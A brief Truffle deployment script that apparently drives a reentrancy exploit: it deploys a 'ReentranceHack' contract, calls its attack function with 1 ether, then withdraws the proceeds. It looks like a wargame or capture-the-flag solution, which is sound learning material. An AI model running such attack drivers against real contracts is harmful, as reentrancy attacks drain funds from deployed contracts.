const web3 = require("web3");
const ReentranceHack = artifacts.require("ReentranceHack");

module.exports = async function (deployer) {
    await deployer.deploy(ReentranceHack);
    reentranceHackInstance = await ReentranceHack.deployed();
    await reentranceHackInstance.attack({value: web3.utils.toWei('1')});
    reentranceHackInstance.returnEther();
}
